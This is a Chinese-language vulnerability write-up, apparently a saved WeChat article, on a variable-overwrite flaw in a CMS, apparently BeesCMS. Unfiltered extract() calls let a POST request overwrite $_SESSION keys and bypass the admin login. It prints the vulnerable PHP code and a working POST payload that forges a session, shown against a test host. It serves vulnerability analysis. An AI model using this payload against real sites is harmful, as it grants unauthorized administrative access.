> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lJbWBltD-61TkJ8mbkwKYg)

一、漏洞描述：

init.php 中存在变量覆盖漏洞，而后台判断登陆的代码仅仅用 $_SESSION 一些键值进行了判断，导致覆盖 $_SESSION 的关键值后，可以绕过登陆的判断，从而登陆后台。

二、漏洞分析过程：

定位到漏洞代码：/includes/init.php

首先对参数进行全局过滤，最后用 extract 进行变量的初始化，这里没有值对 flags 进行限制，所以可以导致任意变量覆盖

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW73WqZeVw6TaDwIEh6uoh3vZMHqP2aWQWDQtWDicjB6dqyEclQcpUG6Yoz1oMMkibl8HsUXicYOiaKSTA/640?wx_fmt=png)

并且覆盖之前已经 session_start() 了，所以不会重新初始化，也就是说 $_SESSION 可以被任意覆盖

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW73WqZeVw6TaDwIEh6uoh3vvDmCoYniaZqa3NFMqrF0hqVwI4o3JgjqSoJy0Hp8265tlPuGV2TmlCg/640?wx_fmt=png)

漏洞部分代码：

```
if (!get_magic_quotes_gpc())
{
    if (isset($_REQUEST))
    {
        $_REQUEST  = addsl($_REQUEST);
    }
    $_COOKIE   = addsl($_COOKIE);
  $_POST = addsl($_POST);
  $_GET = addsl($_GET);
}
if (isset($_REQUEST)){$_REQUEST  = fl_value($_REQUEST);}
    $_COOKIE   = fl_value($_COOKIE);
  $_GET = fl_value($_GET);
@extract($_POST);
@extract($_GET);
@extract($_COOKIE);
```

index.php 包含了 init.php

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW73WqZeVw6TaDwIEh6uoh3vmhiaWcA7rPenUqdoW6c5YcA7gAvft1jQ82l8hNqzmia3m2uhTkeefwhA/640?wx_fmt=png)

然后 /admin/admin.php，会包含 /admin/init.php，这里会用 is_login() 函数进行登陆检查

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW73WqZeVw6TaDwIEh6uoh3vFc8ttZs0gYVuwKv9a7HJxrXlExC4cQNNmvFtda3dIbTKBym1cXXSiaw/640?wx_fmt=png)

跟进 is_login() 函数：/includes/fun.php

可以看到这里判断是否登陆，只是判断了 $_SESSION['login_in']==1 并且 $_SESSION['admin'] 有值就行，然后 $_SESSION['time'] 要大于 3600，就判断为已登陆

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW73WqZeVw6TaDwIEh6uoh3vCx86QQ9vAQ9ThEGveOjghsEqenBuibkWKz7jiadZRNaEvw8SlvFmYZGQ/640?wx_fmt=png)

所以我们可以通过变量覆盖漏洞对 $_SESSION 进行操作，让其满足登陆判断的条件，然后即可实现后台登陆的绕过。

三、漏洞利用：

1、访问首页，覆盖变量

```
http://www.beescms.test/index.php
```

POST 数据：

```
_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=99999999999
```

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW73WqZeVw6TaDwIEh6uoh3vhShNkwFeNeQtYAticyJTiawLx4EBia5gJPKs7zZJ8FBicMIe1zcSL63W2A/640?wx_fmt=png)

2、直接访问后台页面，成功无需登录访问：

```
http://www.beescms.test/admin/admin.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW73WqZeVw6TaDwIEh6uoh3vBStFohxsiaSPPqfFxpw54glae5dqA3aic67DVS9WgL1VgbAZodo2GoTQ/640?wx_fmt=png)